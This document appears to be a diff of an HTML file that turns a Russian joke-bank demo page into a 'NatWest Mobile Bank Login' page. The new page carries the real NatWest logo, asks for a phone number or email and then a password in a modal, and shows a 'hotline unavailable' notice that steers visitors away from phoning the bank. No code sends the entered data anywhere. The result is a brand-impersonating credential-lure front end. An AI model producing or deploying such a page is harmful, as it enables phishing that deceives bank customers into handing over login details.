@@ -1,273 +1,207 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Банк Приколов</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NatWest Mobile Bank Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background: #ffe0f0;
-      color: #550033;
-      margin: 0; padding: 0;
+      background: linear-gradient(to bottom right, #4b0082, #800080);
+      color: white;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
+      padding: 1.5rem;
     }
-    h1, h2 {
-      margin-bottom: 20px;
-      color: #b30059;
-      text-align: center;
-    }
-    .container {
-      background: #ffccdd;
-      padding: 20px;
-      border-radius: 12px;
-      max-width: 420px;
+
+    header {
       width: 100%;
-      box-shadow: 0 0 15px #b30059;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 2rem;
     }
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      border-radius: 8px;
-      border: 2px solid #b30059;
-      font-size: 16px;
-      color: #550033;
-      background: #fff0f6;
-      box-sizing: border-box;
-      transition: background-color 0.3s ease;
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
     }
-    input:focus {
-      outline: none;
-      background-color: #ffd6e8;
-      border-color: #ff66b3;
+
+    .logo {
+      width: 40px;
+      height: 40px;
     }
-    button {
-      background-color: #b30059;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-    button:hover {
-      background-color: #ff66b3;
-    }
-    .hidden {
-      display: none;
-    }
-    label {
-      display: block;
-      margin-top: 10px;
+
+    .bank-name {
+      font-size: 1.5rem;
       font-weight: 600;
     }
-    .error {
-      color: #cc0044;
-      margin-top: 10px;
-      min-height: 20px;
+
+    .header-icons {
+      display: flex;
+      gap: 1rem;
     }
-    #card {
-      background: linear-gradient(135deg, #ff66b3, #b30059);
+
+    .header-icon {
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+    }
+
+    .login-form {
+      width: 100%;
+      max-width: 400px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+    }
+
+    .input-group {
+      margin-bottom: 1.5rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.75rem;
+      border: none;
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.2);
       color: white;
-      border-radius: 20px;
-      padding: 30px;
+      font-size: 1rem;
+    }
+
+    .button {
+      width: 100%;
+      background-color: #ffffff;
+      color: #4b0082;
+      border: none;
+      padding: 0.75rem;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .button:hover {
+      background-color: #f0f0f0;
+    }
+
+    .forgot {
+      margin-top: 1rem;
       text-align: center;
-      box-shadow: 0 10px 20px rgba(179,0,89,0.7);
-      margin-top: 20px;
-      position: relative;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 0.9rem;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background: white;
+      color: black;
+      padding: 2rem;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .modal-close {
+      text-align: right;
+      cursor: pointer;
       font-weight: bold;
-    }
-    #card h3 {
-      margin: 0 0 10px 0;
-      font-size: 24px;
-    }
-    #card p {
-      font-size: 20px;
-      margin: 5px 0;
-    }
-    #card-amount {
-      font-size: 36px;
-      margin-top: 20px;
-      font-family: 'Courier New', Courier, monospace;
     }
   </style>
 </head>
 <body>
-
-  <h1>Банк Приколов</h1>
-
-  <div class="container" id="register-section">
-    <h2>Регистрация</h2>
-    <label>Имя</label>
-    <input type="text" id="reg-firstname" placeholder="Введите имя" />
-    <label>Фамилия</label>
-    <input type="text" id="reg-lastname" placeholder="Введите фамилию" />
-    <label>Номер телефона</label>
-    <input type="text" id="reg-phone" placeholder="Введите номер телефона (цифры)" />
-    <label>Пароль</label>
-    <input type="password" id="reg-password" placeholder="Введите пароль" />
-    <button id="btn-register">Зарегистрироваться</button>
-    <div id="reg-error" class="error"></div>
-  </div>
-
-  <div class="container" id="login-section" style="margin-top: 20px;">
-    <h2>Вход</h2>
-    <label>Номер телефона</label>
-    <input type="text" id="login-phone" placeholder="Введите номер телефона" />
-    <label>Пароль</label>
-    <input type="password" id="login-password" placeholder="Введите пароль" />
-    <button id="btn-login">Войти</button>
-    <div id="login-error" class="error"></div>
-  </div>
-
-  <div class="container hidden" id="client-panel">
-    <h2>Добро пожаловать, <span id="client-name"></span>!</h2>
-
-    <div id="card">
-      <h3>Счёт ссаной нищенки</h3>
-      <p>Банк Приколов</p>
-      <p id="card-amount">$100,000</p>
+  <header>
+    <div class="logo-container">
+      <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/2/2c/NatWest_logo.svg" alt="NatWest Logo" />
+      <span class="bank-name">NatWest</span>
     </div>
+    <div class="header-icons">
+      <img src="https://www.svgrepo.com/show/349398/chat.svg" alt="Support" class="header-icon" onclick="openModal('support')" />
+      <img src="https://www.svgrepo.com/show/354002/phone.svg" alt="Phone" class="header-icon" onclick="openModal('phone')" />
+    </div>
+  </header>
 
-    <button id="btn-logout" style="margin-top: 20px; background: #cc0055;">Выйти</button>
+  <form class="login-form" onsubmit="event.preventDefault(); openModal('password')">
+    <div class="input-group">
+      <label for="login">Phone Number or Email</label>
+      <input type="text" id="login" placeholder="+44 or +7 or email@example.com" required />
+    </div>
+    <button class="button" type="submit">Continue</button>
+    <div class="forgot">Forgot password?</div>
+  </form>
+
+  <div class="modal" id="support-modal">
+    <div class="modal-content">
+      <div class="modal-close" onclick="closeModal('support')">X</div>
+      <h3>Customer Support</h3>
+      <p>Enter your email and message below:</p>
+      <input type="email" placeholder="you@example.com" style="width: 100%; padding: 0.5rem; margin-top: 1rem;" />
+      <textarea placeholder="Your message..." style="width: 100%; margin-top: 1rem; padding: 0.5rem;"></textarea>
+      <button class="button" style="margin-top: 1rem;">Send</button>
+    </div>
   </div>
 
-<script>
-  function loadClients() {
-    const raw = localStorage.getItem('clients');
-    return raw ? JSON.parse(raw) : {};
-  }
-  function saveClients(clients) {
-    localStorage.setItem('clients', JSON.stringify(clients));
-  }
+  <div class="modal" id="phone-modal">
+    <div class="modal-content">
+      <div class="modal-close" onclick="closeModal('phone')">X</div>
+      <h3>Hotline Unavailable</h3>
+      <p>You're not in the UK. Please visit our website to get the international support number.</p>
+    </div>
+  </div>
 
-  let clients = loadClients();
-  let currentClientId = null;
+  <div class="modal" id="password-modal">
+    <div class="modal-content">
+      <div class="modal-close" onclick="closeModal('password')">X</div>
+      <h3>Enter Your Password</h3>
+      <input type="password" placeholder="Password" style="width: 100%; padding: 0.75rem; margin-top: 1rem;" />
+      <button class="button" style="margin-top: 1rem;">Login</button>
+    </div>
+  </div>
 
-  const regFirstName = document.getElementById('reg-firstname');
-  const regLastName = document.getElementById('reg-lastname');
-  const regPhone = document.getElementById('reg-phone');
-  const regPassword = document.getElementById('reg-password');
-  const regError = document.getElementById('reg-error');
-
-  const loginPhone = document.getElementById('login-phone');
-  const loginPassword = document.getElementById('login-password');
-  const loginError = document.getElementById('login-error');
-
-  const clientPanel = document.getElementById('client-panel');
-  const clientName = document.getElementById('client-name');
-  const registerSection = document.getElementById('register-section');
-  const loginSection = document.getElementById('login-section');
-
-  const btnLogout = document.getElementById('btn-logout');
-
-  // Регистрация
-  document.getElementById('btn-register').onclick = () => {
-    regError.textContent = '';
-    const firstName = regFirstName.value.trim();
-    const lastName = regLastName.value.trim();
-    const phone = regPhone.value.trim();
-    const password = regPassword.value;
-
-    if (!firstName) {
-      regError.textContent = 'Введите имя';
-      return;
-    }
-    if (!lastName) {
-      regError.textContent = 'Введите фамилию';
-      return;
-    }
-    if (!phone.match(/^\d{5,15}$/)) {
-      regError.textContent = 'Введите корректный номер телефона (5-15 цифр)';
-      return;
-    }
-    if (!password) {
-      regError.textContent = 'Введите пароль';
-      return;
+  <script>
+    function openModal(type) {
+      document.getElementById(`${type}-modal`).style.display = 'flex';
     }
 
-    // Проверка занятости телефона
-    for (const id in clients) {
-      if (clients[id].phone === phone) {
-        regError.textContent = 'Пользователь с таким номером телефона уже зарегистрирован';
-        return;
-      }
+    function closeModal(type) {
+      document.getElementById(`${type}-modal`).style.display = 'none';
     }
+  </script>
+</body>
+</html>
 
-    // Создаем ID
-    const id = 'id-' + Math.random().toString(36).substr(2, 9);
-
-    clients[id] = {
-      firstname: firstName,
-      lastname: lastName,
-      phone: phone,
-      password: password
-    };
-
-    saveClients(clients);
-
-    alert('Регистрация прошла успешно! Теперь войдите в аккаунт.');
-
-    regFirstName.value = '';
-    regLastName.value = '';
-    regPhone.value = '';
-    regPassword.value = '';
-  };
-
-  // Вход
-  document.getElementById('btn-login').onclick = () => {
-    loginError.textContent = '';
-    const phone = loginPhone.value.trim();
-    const password = loginPassword.value;
-
-    if (!phone.match(/^\d{5,15}$/)) {
-      loginError.textContent = 'Введите корректный номер телефона (5-15 цифр)';
-      return;
-    }
-    if (!password) {
-      loginError.textContent = 'Введите пароль';
-      return;
-    }
-
-    // Ищем клиента по телефону
-    let foundClientId = null;
-    for (const id in clients) {
-      if (clients[id].phone === phone && clients[id].password === password) {
-        foundClientId = id;
-        break;
-      }
-    }
-
-    if (!foundClientId) {
-      loginError.textContent = 'Неверный номер телефона или пароль';
-      return;
-    }
-
-    currentClientId = foundClientId;
-    showClientPanel();
-  };
-
-  function showClientPanel() {
-    const client = clients[currentClientId];
-    clientName.textContent = client.firstname + ' ' + client.lastname;
-    registerSection.classList.add('hidden');
-    loginSection.classList.add('hidden');
-    clientPanel.classList.remove('hidden');
-  }
-
-  btnLogout.onclick = () => {
-    currentClientId = null;
-    clientPanel.classList.add('hidden');
-    registerSection.classList.remove('hidden');
-    loginSection.classList.remove('hidden');
-    loginPhone.value = '';
-    loginPassword.value = '';
-    loginError.textContent = '';
-  };
-</script>
 
 </body>
 </html>
